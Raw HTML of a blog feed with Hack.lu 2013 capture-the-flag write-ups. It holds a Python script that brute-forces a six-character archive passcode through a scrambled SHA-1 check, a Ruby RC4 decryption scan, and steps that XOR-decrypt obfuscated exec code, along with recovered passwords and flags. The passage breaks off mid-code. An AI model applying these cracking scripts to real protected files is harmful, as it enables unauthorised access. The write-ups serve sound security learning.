</span><span class='line'>    <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'>    <span class="n">dec</span> <span class="o">=</span> <span class="no">RC4</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span><span class='line'>    <span class="n">cleartext</span> <span class="o">=</span> <span class="n">dec</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="n">cleartext</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="sr">/^[\w\s]{6}/</span><span class="p">)</span> <span class="ow">and</span> <span class="n">cleartext</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="sr">/key|flag/i</span><span class="p">)</span>
</span><span class='line'>        <span class="nb">puts</span> <span class="n">cleartext</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">offset</span> <span class="o">+=</span> <span class="mi">8</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>

<h2>Solution</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>% ruby fluxarchiv2.rb
</span><span class='line'>e electron and the switch, the
</span><span class='line'>beauty of the baud.  We make use of a service already existing without paying
</span><span class='line'><span class="k">for </span>what could be dirt-cheap <span class="k">if </span>it wasn<span class="s1">&#39;t run by profiteering gluttons, and</span>
</span><span class='line'><span class="s1">you call us criminals.  We explore... and you call us criminals.  We seek</span>
</span><span class='line'><span class="s1">after knowledge... and you call us criminals.  We exist without skin color,</span>
</span><span class='line'><span class="s1">without nationality, without religious bias... and you call us criminals.</span>
</span><span class='line'><span class="s1">You build atomic bombs, you wage wars, you murder, cheat, and lie to us</span>
</span><span class='line'><span class="s1">and try to make us believe it&#39;</span>s <span class="k">for </span>our own good, yet we<span class="s1">&#39;re the criminals.</span>
</span><span class='line'>
</span><span class='line'><span class="s1">Yes, I am a criminal.  My crime is that of curiosity.  My crime is</span>
</span><span class='line'><span class="s1">that of judging people by what they say and think, not what they look like.</span>
</span><span class='line'><span class="s1">My crime is that of outsmarting you, something that you will never forgive me</span>
</span><span class='line'><span class="s1">for.</span>
</span><span class='line'>
</span><span class='line'><span class="s1">I am a hacker, and this is my manifesto.  You may stop this individual,</span>
</span><span class='line'><span class="s1">but you can&#39;</span>t stop us all... after all, we<span class="err">&#39;</span>re all alike.
</span><span class='line'>
</span><span class='line'>+++The Mentor+++
</span><span class='line'>
</span><span class='line'>Flag: D3letinG-1nd3x_F4iL
</span></code></pre></td></tr></table></div></figure>

<p><code>D3letinG-1nd3x_F4iL</code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hack.lu 2013 - Flux Archive Part 1]]></title>
    <link href="http://www.captchaflag.com/blog/2013/10/27/hack-dot-lu-2013-flux-archive-part-1/"/>
    <updated>2013-10-27T15:42:00-04:00</updated>
    <id>http://www.captchaflag.com/blog/2013/10/27/hack-dot-lu-2013-flux-archive-part-1</id>
    <content type="html"><![CDATA[<h2>Challenge</h2>

<p>These funny humans try to exclude us from the delicious beer of the Oktoberfest! They made up a passcode for everyone who wants to enter the Festzelt. Sadly, our human informant friend could not learn the passcode for us. But he heard a conversation between two drunken humans, that they were using the same passcode for this intercepted archive file. They claimed that the format is is absolutely secure and solves any kind of security issue. It&#8217;s written by this funny hacker group named FluxFingers. Real jerks if you ask me. Anyway, it seems that the capability of drunken humans to remember things is limited. So they just used a 6 character passcode with only numbers and upper-case letters. So crack this passcode and get our ticket to their delicious german beer!</p>

<p>Here is the challenge: https://ctf.fluxfingers.net/static/downloads/fluxarchiv/hacklu2013<em>archiv</em>challenge1.tar.gz</p>

<h2>Analysis</h2>

<p>Provided with a 64-bit ELF and a data file.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>stacks0n@ubuntu:~/Desktop$ ./archiv
</span><span class='line'>
</span><span class='line'>################################################################################
</span><span class='line'>
</span><span class='line'>FluxArchiv - solved security since 2007!
</span><span class='line'>Written by sqall - leading expert in social-kernel-web-reverse-engineering.
</span><span class='line'>
</span><span class='line'>################################################################################
</span><span class='line'>
</span><span class='line'>Unknown or invalid command.
</span><span class='line'>
</span><span class='line'>Usage: ./archiv &lt;command&gt; &lt;archiv&gt; &lt;password&gt; &lt;file&gt;
</span><span class='line'>commands:
</span><span class='line'>-l &lt;archiv&gt; &lt;password&gt; - lists all files in the archiv.
</span><span class='line'>-a &lt;archiv&gt; &lt;password&gt; &lt;file&gt; - adds a file to the archiv (when archiv does not exist create a new archiv).
</span><span class='line'>-x &lt;archiv&gt; &lt;password&gt; &lt;filename&gt; - extracts the given filename from the archiv.
</span><span class='line'>-d &lt;archiv&gt; &lt;password&gt; &lt;filename&gt; - delete the given filename from the archiv.</span></code></pre></td></tr></table></div></figure>

<p>Presumably, we could try to brute force the entire key space (36^6) but that might take a while when trying to execute the program. So let&#8217;s look into some of the key functions. Tracing backwards from the output of &quot;Given password is not correct&quot; we target verifyArchiv()</p>

<h3>verifyArchiv</h3>

<p>This method reads 0x14 (20) bytes from the archive file starting at offset 0xC (12) which is our target hash to verify that the password is accurate. It starts by grabbing bytes from hash_password (SHA-1 sum of password) out of order, but in a predictable manner. Look at the python code for that order. Then, the byte stream of the hash is run through SHA-1 and compared against the target. Thus, we can brute force the entire key space only running the code necessary to find the target.</p>

<h2>Code</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">hashlib</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">string</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">itertools</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">bruteforce</span><span class="p">(</span><span class="n">charset</span><span class="p">,</span> <span class="n">maxlength</span><span class="p">):</span>
</span><span class='line'>    <span class="k">return</span> <span class="p">(</span><span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">candidate</span><span class="p">)</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">candidate</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">chain</span><span class="o">.</span><span class="n">from_iterable</span><span class="p">(</span><span class="n">itertools</span><span class="o">.</span><span class="n">product</span><span class="p">(</span><span class="n">charset</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">maxlength</span><span class="p">,</span> <span class="n">maxlength</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)))</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">attempt</span> <span class="ow">in</span> <span class="n">bruteforce</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_uppercase</span><span class="p">,</span> <span class="mi">6</span><span class="p">):</span>
</span><span class='line'>    <span class="nb">hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">(</span><span class="n">attempt</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
</span><span class='line'>    <span class="n">hash_scramble</span> <span class="o">=</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="nb">hash</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span>
</span><span class='line'>    <span class="n">new_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">(</span><span class="n">hash_scramble</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">new_hash</span> <span class="o">==</span> <span class="s">&quot;372942df2712824505d8171f4f0bcb14153d39ba&quot;</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;Found passphrase: &quot;</span> <span class="o">+</span> <span class="n">attempt</span>
</span><span class='line'>        <span class="k">break</span>
</span></code></pre></td></tr></table></div></figure>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">stacks0n</span><span class="nd">@ubuntu</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="err">$</span> <span class="n">python</span> <span class="n">fluxarchiv</span><span class="o">.</span><span class="n">py</span>
</span><span class='line'><span class="n">Found</span> <span class="n">passphrase</span><span class="p">:</span> <span class="n">PWF41L</span>
</span><span class='line'>
</span><span class='line'><span class="n">stacks0n</span><span class="nd">@ubuntu</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="err">$</span> <span class="o">./</span><span class="n">archiv</span> <span class="o">-</span><span class="n">l</span> <span class="n">FluxArchiv</span><span class="o">.</span><span class="n">arc</span> <span class="n">PWF41L</span>
</span><span class='line'>
</span><span class='line'><span class="c">################################################################################</span>
</span><span class='line'>
</span><span class='line'><span class="n">FluxArchiv</span> <span class="o">-</span> <span class="n">solved</span> <span class="n">security</span> <span class="n">since</span> <span class="mi">2007</span><span class="err">!</span>
</span><span class='line'><span class="n">Written</span> <span class="n">by</span> <span class="n">sqall</span> <span class="o">-</span> <span class="n">leading</span> <span class="n">expert</span> <span class="ow">in</span> <span class="n">social</span><span class="o">-</span><span class="n">kernel</span><span class="o">-</span><span class="n">web</span><span class="o">-</span><span class="n">reverse</span><span class="o">-</span><span class="n">engineering</span><span class="o">.</span>
</span><span class='line'>
</span><span class='line'><span class="c">################################################################################</span>
</span><span class='line'>
</span><span class='line'><span class="n">Filename</span><span class="p">:</span>                                               <span class="n">Size</span> <span class="ow">in</span> <span class="n">archiv</span><span class="p">:</span>
</span><span class='line'><span class="o">--------------------------------------------------------------------------------</span>
</span><span class='line'><span class="n">attentionzombie</span><span class="o">.</span><span class="n">mp3</span>                                                     <span class="mi">22</span> <span class="n">kB</span>
</span><span class='line'><span class="n">Did_You_Know</span><span class="o">.</span><span class="n">jpg</span>                                                        <span class="mi">139</span> <span class="n">kB</span>
</span><span class='line'><span class="n">fluxfingers</span><span class="o">.</span><span class="n">png</span>                                                 <span class="mi">9</span> <span class="n">kB</span>
</span><span class='line'><span class="n">th_oh</span><span class="o">-</span><span class="n">noes</span><span class="o">-</span><span class="n">everybody</span><span class="o">-</span><span class="n">panic</span><span class="o">.</span><span class="n">gif</span>                                                  <span class="mi">131</span> <span class="n">kB</span>
</span><span class='line'>
</span><span class='line'><span class="n">stacks0n</span><span class="nd">@ubuntu</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">alh</span> <span class="n">attentionzombie</span><span class="o">.</span><span class="n">mp3</span> <span class="n">Did_You_Know</span><span class="o">.</span><span class="n">jpg</span> <span class="n">fluxfingers</span><span class="o">.</span><span class="n">png</span> <span class="n">th_oh</span><span class="o">-</span><span class="n">noes</span><span class="o">-</span><span class="n">everybody</span><span class="o">-</span><span class="n">panic</span><span class="o">.</span><span class="n">gif</span>
</span><span class='line'><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">stacks0n</span> <span class="n">stacks0n</span>  <span class="mi">23</span><span class="n">K</span> <span class="n">Oct</span> <span class="mi">23</span> <span class="mo">04</span><span class="p">:</span><span class="mi">30</span> <span class="n">attentionzombie</span><span class="o">.</span><span class="n">mp3</span>
</span><span class='line'><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">stacks0n</span> <span class="n">stacks0n</span> <span class="mi">135</span><span class="n">K</span> <span class="n">Oct</span> <span class="mi">23</span> <span class="mo">04</span><span class="p">:</span><span class="mi">30</span> <span class="n">Did_You_Know</span><span class="o">.</span><span class="n">jpg</span>
</span><span class='line'><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">stacks0n</span> <span class="n">stacks0n</span> <span class="mf">9.0</span><span class="n">K</span> <span class="n">Oct</span> <span class="mi">23</span> <span class="mo">04</span><span class="p">:</span><span class="mi">31</span> <span class="n">fluxfingers</span><span class="o">.</span><span class="n">png</span>
</span><span class='line'><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">stacks0n</span> <span class="n">stacks0n</span> <span class="mi">127</span><span class="n">K</span> <span class="n">Oct</span> <span class="mi">23</span> <span class="mo">04</span><span class="p">:</span><span class="mi">31</span> <span class="n">th_oh</span><span class="o">-</span><span class="n">noes</span><span class="o">-</span><span class="n">everybody</span><span class="o">-</span><span class="n">panic</span><span class="o">.</span><span class="n">gif</span>
</span></code></pre></td></tr></table></div></figure>

<p>Nothing stands out as to what the flag might be. Okay, I&#8217;m dumb it is the password :)</p>

<h2>Solution</h2>

<p>PWF41L</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hack.lu 2013 - Packed]]></title>
    <link href="http://www.captchaflag.com/blog/2013/10/27/hack-dot-lu-2013-packed/"/>
    <updated>2013-10-27T15:39:00-04:00</updated>
    <id>http://www.captchaflag.com/blog/2013/10/27/hack-dot-lu-2013-packed</id>
    <content type="html"><![CDATA[<h2>Challenge</h2>

<p>We just found a dead robot. It seems there is some useful data left but somehow it got confused with other data and now we don&#8217;t know what&#8217;s useful and what&#8217;s junk. We just know there is only one way to go but there are many dead ends.</p>

<p>Here is the challenge: http://ctf.fluxfingers.net/static/downloads/packed/packed</p>

<h2>Hint</h2>

<p>Think outside the box - being several types at once like an animal that can change its color. Excuse the inaccuracy, but that&#8217;s what you&#8217;re searching for.</p>

<h2>Analysis</h2>

<p>We are provided with a file that appears to contain a bunch of different data and files packaged together. After a bit of basic analysis, we see the following:</p>

<ul>
<li>a string alluding to rot13 encryption</li>
<li>strange looking text with a few instances of (&quot;zip&quot;)</li>
<li>PDF (&quot;no hint here&quot;)</li>
<li>Base64 encoded blob which happens to be an open office document (&quot;no hint here&quot;)

<ul>
<li>embedded PNG (&quot;no hint here&quot;) within the .odt </li>
</ul></li>
</ul>

<p>If we rot13 the strange looking plaintext we find the following python script:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">cipher</span> <span class="o">=</span> <span class="s">&quot;H51</span><span class="se">\\\&#39;</span><span class="s">Ux2J&amp;+(3Z;Uxcx0Xxs</span><span class="se">\x13</span><span class="s">h</span><span class="se">\x01</span><span class="s">4$V!R($R&gt;</span><span class="se">\t</span><span class="s">/)R!</span><span class="se">\x01</span><span class="s">&lt;.</span><span class="se">\x13</span><span class="s">,N-aP4M4aRuG1-VuU0 GuH+a@0W=3R9</span><span class="se">\x01</span><span class="s">&gt;(_0</span><span class="se">\x01</span><span class="s">,8C0Rx GuN6</span><span class="se">\&quot;</span><span class="s">V|</span><span class="se">\x1e</span><span class="s">z</span>
</span><span class='line'><span class="n">KZ3</span>\<span class="n">x014</span><span class="err">$</span><span class="p">]}</span><span class="n">R</span><span class="err">!</span><span class="mi">2</span>\<span class="n">x1d4S</span><span class="err">?</span><span class="mi">7</span>\<span class="n">x1au</span>\<span class="n">x1fxs</span>\<span class="n">t_</span>\<span class="n">x01xa</span>\<span class="n">x13</span><span class="o">&lt;</span><span class="n">Gx</span><span class="p">)</span><span class="n">R</span><span class="o">&amp;</span><span class="n">Ip2J</span><span class="o">&amp;</span>\<span class="n">x0f93T</span><span class="c">#zj\x1c\x1ap\x13rk\x00g\x01e|\x13g\x19ju\x0ba\x18jt\x02o+xa\x13u\x01</span>
</span><span class='line'><span class="n">xa</span>\<span class="n">x13</span><span class="o">%</span><span class="n">S1</span><span class="o">/</span><span class="n">Gu</span>\<span class="n">x03</span>\<span class="n">x1b</span><span class="o">.</span>\\<span class="p">:</span><span class="n">N7</span><span class="o">.</span>\\<span class="p">:</span><span class="n">N4o</span>\<span class="n">x13</span>\<span class="n">x0cN</span><span class="o">-</span><span class="mi">3</span>\<span class="n">x133M9</span><span class="o">&amp;</span>\<span class="n">x13</span><span class="o">&lt;</span><span class="n">Rx</span> <span class="n">A2WjiZ</span><span class="p">{</span><span class="n">DvaX0Xjh</span>\<span class="n">x136N6</span>\<span class="s">&quot;R!</span><span class="se">\x01\x07</span><span class="s">rC0p</span><span class="se">\x13</span><span class="s">8a</span><span class="se">\x1d</span><span class="s">c22ieu</span><span class="se">\x16</span><span class="s">1Fw+=-@0</span><span class="se">\x1b</span><span class="s">Ra</span>
</span><span class='line'>\<span class="n">x13u</span>\<span class="n">x01</span><span class="p">(</span><span class="mi">3</span><span class="n">Z</span><span class="p">;</span><span class="n">UxcR</span>\<span class="s">&#39;F.s</span><span class="se">\x1c</span><span class="s">&gt;D!s</span><span class="se">\x13</span><span class="s">&lt;Rx,Z&amp;R1/Tw+R&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">n</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">;</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">hashlib</span><span class="o">,</span> <span class="nn">sys</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">try</span><span class="p">:</span>
</span><span class='line'>    <span class="n">key</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="k">except</span> <span class="ne">IndexError</span> <span class="p">:</span>
</span><span class='line'>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="s">&quot;x</span><span class="se">\x9c\xf3</span><span class="s">N</span><span class="se">\xad</span><span class="s">T0T</span><span class="se">\xc8\xcd</span><span class="s">,.</span><span class="se">\xce\xcc</span><span class="s">KW</span><span class="se">\xc8\xcc</span><span class="s">SH,J/</span><span class="se">\x03\x00</span><span class="s">M</span><span class="se">\x97\x07\\</span><span class="s">&quot;</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&quot;zip&quot;</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">f</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">hashlib</span><span class="p">,</span><span class="s">&quot;x</span><span class="se">\x9c\xcb</span><span class="s">M1</span><span class="se">\x05\x00\x02</span><span class="s">G</span><span class="se">\x01\x07</span><span class="s">&quot;</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&quot;zip&quot;</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="n">n</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">5</span> <span class="o">*</span><span class="mi">10</span> <span class="o">**</span><span class="mi">6</span> <span class="p">):</span>
</span><span class='line'>    <span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="n">f</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">());</span>
</span><span class='line'>    <span class="n">n</span> <span class="o">=</span> <span class="n">n</span> <span class="o">+</span> <span class="mi">1</span>
</span><span class='line'>    <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="p">[:</span><span class="mi">5</span><span class="p">]</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">cipher</span><span class="p">):</span>
</span><span class='line'>    <span class="n">key</span> <span class="o">=</span> <span class="n">key</span> <span class="o">*</span> <span class="mi">2</span>
</span><span class='line'>    <span class="n">plain</span> <span class="o">=</span><span class="s">&quot;&quot;</span><span class="o">.</span><span class="n">join</span> <span class="p">(</span><span class="nb">map</span> <span class="p">(</span><span class="nb">chr</span> <span class="p">,[</span><span class="nb">ord</span> <span class="p">(</span><span class="n">a</span> <span class="p">)</span><span class="o">^</span><span class="nb">ord</span> <span class="p">(</span><span class="n">b</span> <span class="p">)</span><span class="k">for</span> <span class="n">a</span> <span class="p">,</span><span class="n">b</span> <span class="ow">in</span> <span class="nb">zip</span> <span class="p">(</span><span class="n">cipher</span> <span class="p">,</span><span class="n">key</span> <span class="p">)]))</span>
</span><span class='line'><span class="k">try</span><span class="p">:</span>
</span><span class='line'>    <span class="k">exec</span> <span class="n">plain</span>
</span><span class='line'><span class="k">except</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;x</span><span class="se">\x9c\x0b</span><span class="s">/</span><span class="se">\xca\xcf</span><span class="s">KW</span><span class="se">\xf0</span><span class="s">N</span><span class="se">\xad</span><span class="s">T</span><span class="se">\x04\x00\x14</span><span class="s">d</span><span class="se">\x03</span><span class="s">x&quot;</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&quot;zip&quot;</span><span class="p">),</span> <span class="nb">repr</span><span class="p">(</span><span class="n">plain</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>

<p>There is another block of 256-bytes that we aren&#8217;t entirely sure what to do with, but analyzing the code further its simply using a 5-character key to XOR decrypt the ciphertext. More than likely the plaintext that is being sent to exec() is going to be python code, so let&#8217;s break out xortool to see if we can find a key. Note, we specify the most common character should be space.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>% python xortool.py -l 5 -c <span class="s1">&#39; &#39;</span> ciphertext
</span><span class='line'>1 possible key<span class="o">(</span>s<span class="o">)</span> of length 5:
</span><span class='line'>!XA3U
</span></code></pre></td></tr></table></div></figure>

<p>Then, we can simply patch the python code to force the decryption. Patch the last block of code to to look like the following:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">key</span> <span class="o">=</span> <span class="s">&quot;!XA3U&quot;</span>
</span><span class='line'><span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">cipher</span><span class="p">):</span>
</span><span class='line'>    <span class="n">key</span> <span class="o">=</span> <span class="n">key</span> <span class="o">*</span> <span class="mi">2</span>
</span><span class='line'>    <span class="n">plain</span> <span class="o">=</span><span class="s">&quot;&quot;</span><span class="o">.</span><span class="n">join</span> <span class="p">(</span><span class="nb">map</span> <span class="p">(</span><span class="nb">chr</span> <span class="p">,[</span><span class="nb">ord</span> <span class="p">(</span><span class="n">a</span> <span class="p">)</span><span class="o">^</span><span class="nb">ord</span> <span class="p">(</span><span class="n">b</span> <span class="p">)</span><span class="k">for</span> <span class="n">a</span> <span class="p">,</span><span class="n">b</span> <span class="ow">in</span> <span class="nb">zip</span> <span class="p">(</span><span class="n">cipher</span> <span class="p">,</span><span class="n">key</span> <span class="p">)]))</span>
</span><span class='line'><span class="k">try</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="n">plain</span>
</span><span class='line'>    <span class="k">exec</span> <span class="n">plain</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Ah-hah, this now yields the following code:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
